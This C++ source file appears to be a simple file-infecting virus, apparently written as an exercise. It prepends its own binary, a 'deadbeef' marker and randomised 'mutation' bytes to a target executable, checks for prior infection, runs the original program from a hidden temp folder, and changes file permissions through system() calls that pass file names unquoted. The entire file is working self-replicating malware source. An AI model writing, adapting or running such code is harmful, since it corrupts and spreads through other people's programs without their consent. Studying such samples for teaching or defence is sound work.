#include <bits/stdc++.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>
#include <fstream>
#include <string>
#include <stdlib.h>
#include <filesystem>

using namespace std;

bool is_file_exist(std::string fileName);
void create_directory(std::string directory);
void copy_binary(std::string host, std::string folder);
void copy_uninfected_binary(std::string host, std::string folder);
void modify_execute_access(std::string fileName, bool enable);
void modify_write_access(std::string fileName, bool enable);
int get_file_size(std::string fileName);
void build_seed(std::string programName);
void copy_virus_binary(std::string host, std::string folder);
void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation);
int get_virus_size();
bool is_infected(std::string infectedHost, std::string binary);
void create_empty_seed();
void generate_hex_string(char str[], int length);
std::string mutate_virus();

int main(int argc, char** argv) {
    std::string fileName;
    std::string argv0(argv[0]);
    std::string hostName = argv0.substr(2);
    std::string temporaryLocation = "garbage";
    std::string folder = "./tem/";
    create_directory(folder);
    if(argc == 1){
      copy_uninfected_binary(hostName, folder);
      std::string command = hostName;
      command.insert(0, folder);
      system(command.c_str());
    }
    if(argc > 1){
      copy_uninfected_binary(hostName, folder);
      std::string command = hostName;
      command.insert(0, folder);
      fileName = argv[1];
      command.insert(command.length(), " " + fileName);
      if(is_file_exist(fileName)){
        system(command.c_str());
        if(!is_infected(hostName, fileName)){
          modify_write_access(fileName, true);
          modify_execute_access(fileName, false);
          make_temp_copy(hostName, fileName, folder, temporaryLocation);
          infect_file(hostName, fileName, folder, temporaryLocation);
        }
        else{
          return 1;
        }
      }
      else{
        return -1;
      }
    }
    else{
      if(hostName == "virus"){
          create_empty_seed();
          build_seed(hostName);
      }
      fileName = "";
    }
    return 0;
}

std::string mutate_virus(){
  int length = 20;
  char str[length];
  std::string hex = "";
  generate_hex_string(str, length);
  for(int i = 0; i < length; i++){
    hex += str[i];
  }
  return hex;
}

void generate_hex_string(char str[], int length)
{
  char hex_characters[]={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
  int i;
  srand(time(0));
  for(i=0;i<length;i++)
  {
    str[i]=hex_characters[rand()%16];
  }
  str[length]=0;
}

bool is_infected(std::string infectedHost, std::string binary){
  int virusSize = get_virus_size();
  int binarySize = get_file_size(binary);
  if(binarySize < virusSize){
    return false;
  }
  else{
    std::ifstream host(infectedHost, std::ios::binary);
    std::ifstream bin(binary, std::ios::binary);
    char buffer1[virusSize];
    char buffer2[virusSize];
    size_t actual1 = host.readsome(buffer1, virusSize);
    size_t actual2 = bin.readsome(buffer2, virusSize);
    if(actual1 == actual2){
      for(int i = 0; i < virusSize; i++){
        if(buffer1[i] != buffer2[i]){
          return false;
        }
      }
    }
    else{
      return false;
    }
  }
  return true;
}

void create_empty_seed(){
  system("touch seed");
  system("echo \"\" > seed");
}

void build_seed(std::string progName){
  std::ifstream virus(progName, std::ios::binary);
  std::ifstream host("host", std::ios::binary);
  std::ofstream seed("seed", std::ios::binary);
  seed << virus.rdbuf();
  std::string hex = "deadbeef";
  for (size_t i = 0; i < hex.length(); i += 2)
  {
    uint16_t byte;
    std::string nextbyte = hex.substr(i, 2);
    std::istringstream(nextbyte) >> std::hex >> byte;
    seed << static_cast<uint8_t>(byte);
  }
  hex = mutate_virus();
  for (size_t i = 0; i < hex.length(); i += 2)
  {
    uint16_t byte;
    std::string nextbyte = hex.substr(i, 2);
    std::istringstream(nextbyte) >> std::hex >> byte;
    seed << static_cast<uint8_t>(byte);
  }
  seed << host.rdbuf();
  seed.close();
  host.close();
  virus.close();
  modify_execute_access("seed", true);
}

int get_file_size(std::string fileName){
  return std::filesystem::file_size(fileName);
}

int get_virus_size(){
  return get_file_size("virus");
}

void copy_virus_binary(std::string host, std::string folder){
    std::string hostSrc = host;
    std::string hostDest = "virus";
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    char buffer[virusSize];
    size_t actual = src.readsome(buffer, virusSize);
    dst.write(buffer, actual);
    src.close();
    dst.close();
}

void make_temp_copy(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
    std::string hostSrc = fileName;
    std::string hostDest = temporaryLocation;
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    dst << src.rdbuf();
}

void infect_file(std::string infectedHost, std::string fileName, std::string folder, std::string temporaryLocation){
    std::string hostSrc = infectedHost;
    std::string hostDest = fileName;
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    char buffer[virusSize];
    size_t actual = src.readsome(buffer, virusSize);
    dst.write(buffer, actual);
    src.close();
    std::string hex = "deadbeef";
    for (size_t i = 0; i < hex.length(); i += 2)
    {
      uint16_t byte;
      std::string nextbyte = hex.substr(i, 2);
      std::istringstream(nextbyte) >> std::hex >> byte;
      dst << static_cast<uint8_t>(byte);
    }
    hex = mutate_virus();
    for (size_t i = 0; i < hex.length(); i += 2)
    {
      uint16_t byte;
      std::string nextbyte = hex.substr(i, 2);
      std::istringstream(nextbyte) >> std::hex >> byte;
      dst << static_cast<uint8_t>(byte);
    }
    hostSrc = temporaryLocation;
    hostSrc.insert(0, folder);
    std::ifstream src1(hostSrc, std::ios::binary);
    dst << src1.rdbuf();
    dst.close();
    src1.close();
    hostSrc.insert(0, "rm ");
    system(hostSrc.c_str());
}

void copy_uninfected_binary(std::string host, std::string folder){
    std::string hostSrc = host;
    std::string hostDest = host;
    hostDest.insert(0, folder);
    std::ifstream src(hostSrc, std::ios::binary);
    std::ofstream dst(hostDest, std::ios::binary);
    int virusSize = get_virus_size();
    src.seekg(virusSize + 14);
    dst << src.rdbuf();
    modify_execute_access(hostDest, true);
}

void modify_execute_access(std::string fileName, bool enable){
    std::string cmdBuilder = fileName;
    if(enable){
      cmdBuilder.insert(0, "chmod ugo+x ");  
    }
    else{
      cmdBuilder.insert(0, "chmod ugo-x ");  
    }
    const char*command  = cmdBuilder.c_str();
    system(command);
}

void modify_write_access(std::string fileName, bool enable){
    std::string cmdBuilder = fileName;
    if(enable){
      cmdBuilder.insert(0, "chmod ugo+w ");  
    }
    else{
      cmdBuilder.insert(0, "chmod ugo-w ");  
    }
    const char*command  = cmdBuilder.c_str();
    system(command);
}

void create_directory(std::string directory){
  const char* dir = directory.c_str();
  int check = mkdir(dir, 0777);
    if(check == -1){
      std::string cmdBuilder = directory;
      cmdBuilder.insert(0, "chmod 0777 ");
      const char*command  = cmdBuilder.c_str();
      system(command);
    }
}

bool is_file_exist (std::string name) {
    ifstream f(name.c_str());
    return f.good();
}
